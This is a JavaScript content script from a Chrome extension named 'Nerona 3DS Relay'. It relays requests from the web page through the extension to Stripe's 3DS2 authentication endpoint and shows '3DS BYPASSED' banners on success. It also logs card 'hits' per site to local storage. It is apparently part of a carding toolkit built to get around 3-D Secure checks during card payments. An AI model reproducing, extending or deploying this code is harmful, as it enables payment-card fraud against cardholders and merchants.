// Nerona 3DS Relay — ISOLATED world bridge
(function() {
  if (window.__Nerona_3DS_RELAY_INJECTED) return;
  window.__Nerona_3DS_RELAY_INJECTED = true;

  var nerona3dsBanners = new Map();
  var nerona3dsBannerDedup = {};

  var nerona3dsThemes = {
    success: {
      accent: '#00e5ff',
      accentRgb: '0,229,255',
      bg: 'linear-gradient(135deg, #0a1628 0%, #0d2137 40%, #0a1628 100%)',
      icon: '\u2620\uFE0F',
      borderAlpha: '0.3',
      shadowAlpha: '0.2'
    },
    fail: {
      accent: '#ff3d71',
      accentRgb: '255,61,113',
      bg: 'linear-gradient(135deg, #1a0a0a 0%, #2d1111 40%, #1a0a0a 100%)',
      icon: '\uD83D\uDC7D',
      borderAlpha: '0.3',
      shadowAlpha: '0.2'
    }
  };

  function neronaRemove3dsBanner(el, bannerId) {
    if (!el || !el.parentNode) return;
    if (el._rafId) cancelAnimationFrame(el._rafId);
    if (el._closeTimeout) clearTimeout(el._closeTimeout);
    el.style.setProperty('transform', 'translateX(-120%)', 'important');
    el.style.setProperty('opacity', '0', 'important');
    setTimeout(function() {
      if (el.parentNode) el.remove();
      nerona3dsBanners.delete(bannerId);
      neronaRelayout3dsStack();
    }, 300);
  }

  function neronaRelayout3dsStack() {
    var top = 20;
    nerona3dsBanners.forEach(function(info) {
      if (info.element && info.element.parentNode) {
        info.element.style.setProperty('top', top + 'px', 'important');
        top += info.height + 8;
      }
    });
  }

  function neronaShow3dsBanner(opts) {
    if (!document.body) {
      if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function() { neronaShow3dsBanner(opts); }, { once: true });
      }
      return;
    }
    if (window.top !== window.self) return;

    var isSuccess = opts.success !== false;
    var detail = opts.detail || '';
    var bannerId = 'nerona-3ds-banner-' + (isSuccess ? 'ok' : 'fail');

    var dedupKey = isSuccess + '_' + detail.substring(0, 30);
    var now = Date.now();
    if (nerona3dsBannerDedup[dedupKey] && now - nerona3dsBannerDedup[dedupKey] < 5000) return;
    nerona3dsBannerDedup[dedupKey] = now;

    var existing = document.getElementById(bannerId);
    if (existing) { neronaRemove3dsBanner(existing, bannerId); }

    var theme = isSuccess ? nerona3dsThemes.success : nerona3dsThemes.fail;
    var title = isSuccess ? '3DS BYPASSED' : '3DS FAILED';
    var subtitle = detail || (isSuccess ? 'Authentication skipped successfully' : 'Stripe rejected the request');
    var badge = isSuccess ? '200' : '400';
    var duration = 4500;

    var topOffset = 20;
    nerona3dsBanners.forEach(function(info) {
      if (info.element && info.element.parentNode) topOffset += info.height + 8;
    });

    var el = document.createElement('div');
    el.id = bannerId;
    el.setAttribute('role', 'alert');
    var s = el.style;
    s.setProperty('position', 'fixed', 'important');
    s.setProperty('top', topOffset + 'px', 'important');
    s.setProperty('left', '20px', 'important');
    s.setProperty('right', 'auto', 'important');
    s.setProperty('z-index', '2147483647', 'important');
    s.setProperty('min-width', '340px', 'important');
    s.setProperty('max-width', '420px', 'important');
    s.setProperty('border-radius', '12px', 'important');
    s.setProperty('overflow', 'hidden', 'important');
    s.setProperty('background', theme.bg, 'important');
    s.setProperty('border', '1px solid rgba(' + theme.accentRgb + ',' + theme.borderAlpha + ')', 'important');
    s.setProperty('box-shadow', '0 8px 32px rgba(' + theme.accentRgb + ',' + theme.shadowAlpha + '), 0 0 0 1px rgba(' + theme.accentRgb + ',0.1)', 'important');
    s.setProperty('font-family', '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif', 'important');
    s.setProperty('opacity', '0', 'important');
    s.setProperty('visibility', 'visible', 'important');
    s.setProperty('margin', '0', 'important');
    s.setProperty('padding', '0', 'important');
    s.setProperty('box-sizing', 'border-box', 'important');
    s.setProperty('transform', 'translateX(-120%)', 'important');
    s.setProperty('transition', 'top 0.3s ease, transform 0.3s ease, opacity 0.3s ease', 'important');

    var glow = document.createElement('div');
    glow.style.cssText = 'position:absolute;top:-50%;left:-50%;width:200%;height:200%;' +
      'background:radial-gradient(circle at 50% 50%, rgba(' + theme.accentRgb + ',0.08) 0%, transparent 60%);' +
      'pointer-events:none;';
    el.appendChild(glow);

    var row = document.createElement('div');
    row.style.cssText = 'position:relative;z-index:2;display:flex;align-items:center;gap:14px;padding:16px 18px;';

    var icon = document.createElement('div');
    icon.textContent = theme.icon;
    icon.style.cssText = 'font-size:26px;line-height:1;flex-shrink:0;' +
      'filter:drop-shadow(0 0 8px rgba(' + theme.accentRgb + ',0.6));';

    var textWrap = document.createElement('div');
    textWrap.style.cssText = 'flex:1;min-width:0;';

    var titleEl = document.createElement('div');
    titleEl.textContent = title;
    titleEl.style.cssText = 'font-size:14px;font-weight:800;letter-spacing:1.2px;text-transform:uppercase;' +
      'color:' + theme.accent + ';text-shadow:0 0 12px rgba(' + theme.accentRgb + ',0.5);line-height:1.3;';

    var subEl = document.createElement('div');
    subEl.textContent = subtitle;
    subEl.style.cssText = 'font-size:12px;color:rgba(255,255,255,0.6);margin-top:3px;line-height:1.3;word-break:break-word;';

    textWrap.appendChild(titleEl);
    textWrap.appendChild(subEl);

    var badgeEl = document.createElement('div');
    badgeEl.textContent = badge;
    badgeEl.style.cssText = 'flex-shrink:0;padding:4px 10px;border-radius:6px;font-size:13px;font-weight:700;' +
      'font-family:"SF Mono","Fira Code",monospace;color:#0a1628;background:' + theme.accent + ';' +
      'box-shadow:0 0 12px rgba(' + theme.accentRgb + ',0.4);';

    var closeBtn = document.createElement('button');
    closeBtn.innerHTML = '\u00D7';
    closeBtn.setAttribute('aria-label', 'Close');
    closeBtn.setAttribute('type', 'button');
    closeBtn.style.cssText = 'flex-shrink:0;width:22px;height:22px;background:rgba(255,255,255,0.08);' +
      'border:1px solid rgba(255,255,255,0.1);border-radius:6px;color:rgba(255,255,255,0.5);' +
      'font-size:16px;line-height:1;cursor:pointer;display:flex;align-items:center;justify-content:center;' +
      'padding:0;transition:background 0.2s,color 0.2s;';
    closeBtn.addEventListener('mouseenter', function() {
      closeBtn.style.setProperty('background', 'rgba(255,255,255,0.15)', 'important');
      closeBtn.style.setProperty('color', 'rgba(255,255,255,0.9)', 'important');
    });
    closeBtn.addEventListener('mouseleave', function() {
      closeBtn.style.setProperty('background', 'rgba(255,255,255,0.08)', 'important');
      closeBtn.style.setProperty('color', 'rgba(255,255,255,0.5)', 'important');
    });
    closeBtn.addEventListener('click', function(e) {
      e.stopPropagation();
      neronaRemove3dsBanner(el, bannerId);
    });

    row.appendChild(icon);
    row.appendChild(textWrap);
    row.appendChild(badgeEl);
    row.appendChild(closeBtn);
    el.appendChild(row);

    var progressTrack = document.createElement('div');
    progressTrack.style.cssText = 'height:3px;background:rgba(255,255,255,0.05);';
    var progressBar = document.createElement('div');
    progressBar.style.cssText = 'height:100%;width:0%;' +
      'background:linear-gradient(90deg, rgba(' + theme.accentRgb + ',0.4), rgba(' + theme.accentRgb + ',0.8));' +
      'border-radius:0 0 12px 12px;';
    progressTrack.appendChild(progressBar);
    el.appendChild(progressTrack);

    document.body.appendChild(el);

    var height = el.getBoundingClientRect().height || 70;
    nerona3dsBanners.set(bannerId, { element: el, height: height });

    requestAnimationFrame(function() {
      requestAnimationFrame(function() {
        el.style.setProperty('transform', 'translateX(0)', 'important');
        el.style.setProperty('opacity', '1', 'important');
      });
    });

    var animStart = Date.now();
    var rafId;
    (function tick() {
      var elapsed = Date.now() - animStart;
      var pct = Math.min(100, (elapsed / duration) * 100);
      progressBar.style.setProperty('width', pct + '%', 'important');
      if (pct < 100 && el.parentNode) {
        rafId = requestAnimationFrame(tick);
      }
    })();
    el._rafId = rafId;

    el._closeTimeout = setTimeout(function() { neronaRemove3dsBanner(el, bannerId); }, duration);
  }

  function show3dsToast() { neronaShow3dsBanner({ success: true }); }
  function show3dsRelayLabel() { neronaShow3dsBanner({ success: true }); }

  var pendingLogEntries = [];
  var isWritingLogs = false;

  function appendLogEntries(entries) {
    if (!Array.isArray(entries)) entries = entries ? [entries] : [];
    entries = entries.filter(function (entry) { return entry && typeof entry === 'object' && !Array.isArray(entry); });
    if (!entries.length) return;
    if (typeof chrome === 'undefined' || !chrome.runtime || !chrome.runtime.id || !chrome.storage || !chrome.storage.local) return;

    var now = Date.now();
    entries.forEach(function (entry) {
      if (entry.timestamp == null) entry.timestamp = now;
      if (entry.type == null) entry.type = 'log';
      if (entry.source == null) entry.source = 'unknown';
      if (entry.site == null) entry.site = (window.location && window.location.hostname) || '';
      if (entry.url == null) entry.url = window.location.href;
    });

    if (isWritingLogs) {
      pendingLogEntries = pendingLogEntries.concat(entries);
      return;
    }
    isWritingLogs = true;

    function writeBatch(batch) {
      chrome.storage.local.get(['Nerona_logs'], function (result) {
        var logs = Array.isArray(result.Nerona_logs) ? result.Nerona_logs.filter(function (entry) {
          return entry && typeof entry === 'object' && !Array.isArray(entry);
        }) : [];

        function dedupKey(e) {
          return Math.floor((e.timestamp || 0) / 100) + '|' +
                 (e.type || '') + '|' +
                 (e.card || '') + '|' +
                 (e.response || '') + '|' +
                 (e.site || '') + '|' +
                 (e.source || '');
        }

        var seen = new Set(logs.map(dedupKey));
        batch.forEach(function (entry) {
          var k = dedupKey(entry);
          if (!seen.has(k)) {
            seen.add(k);
            logs.push(entry);
          }
        });

        logs.sort(function (a, b) { return (b.timestamp || 0) - (a.timestamp || 0); });
        if (logs.length > 50) logs = logs.slice(0, 50);

        chrome.storage.local.set({ Nerona_logs: logs }, function () {
          if (pendingLogEntries.length > 0) {
            var next = pendingLogEntries;
            pendingLogEntries = [];
            writeBatch(next);
          } else {
            isWritingLogs = false;
          }
        });
      });
    }

    writeBatch(entries);
  }

  function appendRelayLog() {
    appendLogEntries({
      timestamp: Date.now(),
      type: 'three_ds',
      response: 'three_ds',
      card: '',
      site: (window.location && window.location.hostname) || '',
      url: window.location.href,
      source: 'relay',
      text: '3DS Bypass relayed'
    });
  }

  // Listen for 3DS relay requests from MAIN world
  window.addEventListener("message", function(event) {
    if (!event.data || event.data.type !== "DB_3DS_RELAY_REQUEST" || !event.data.payload) return;
    var requestId = event.data.payload.requestId;
    var body = event.data.payload.body;
    var origin = (typeof window !== "undefined" && window.location) ? window.location.origin : "";
    var referer = (typeof document !== "undefined" && document.referrer) ? document.referrer : (origin ? origin + "/" : "");

    chrome.runtime.sendMessage({
      type: "Nerona_3DS_RELAY",
      url: "https://api.stripe.com/v1/3ds2/authenticate",
      body: body,
      origin: origin,
      referer: referer
    }, function(response) {
      if (chrome.runtime.lastError) {
        window.postMessage({ type: "DB_3DS_RELAY_RESPONSE", payload: { requestId: requestId, error: chrome.runtime.lastError.message || "Extension error" } }, "*");
        return;
      }
      var payload = (response && response.error)
        ? { requestId: requestId, error: response.error }
        : { requestId: requestId, status: response ? response.status : undefined, statusText: response ? response.statusText : undefined, headers: response ? response.headers : undefined, body: response ? response.body : undefined };
      window.postMessage({ type: "DB_3DS_RELAY_RESPONSE", payload: payload }, "*");
      if (!payload.error) { appendRelayLog(); show3dsToast(); show3dsRelayLabel(); }
    });
  });

  // Listen for generic intercept logs from MAIN world (fallback when direct chrome.storage fails)
  window.addEventListener("message", function(event) {
    if (!event.data || event.data.type !== "Nerona_INTERCEPT_LOG") return;
    var entry = event.data.entry;
    if (!entry || typeof entry !== "object") return;
    if (!entry.timestamp) entry.timestamp = Date.now();
    if (!entry.type) entry.type = "intercept";
    if (!entry.source) entry.source = "main";
    appendLogEntries(entry);
  });

  // Shared atomic append bridge used by all log producers
  window.addEventListener("message", function(event) {
    if (!event.data || event.data.type !== "Nerona_APPEND_LOGS") return;
    var entries = event.data.entries;
    if (!entries) return;
    appendLogEntries(Array.isArray(entries) ? entries : [entries]);
  });

  // Listen for hit events to show effects on page
  window.addEventListener("message", function(event) {
    if (!event.data || event.data.type !== "Nerona_HIT_RECORDED") return;
    show3dsToast();
    show3dsRelayLabel();
  });

  if (chrome.runtime && chrome.runtime.id && chrome.runtime.onMessage) {
    try { chrome.runtime.onMessage.addListener(function(msg) {
      if (msg && msg.type === 'Nerona_HIT_RECORDED') {
        show3dsToast();
        show3dsRelayLabel();
      }
    }); } catch(e) {}
  }
})();
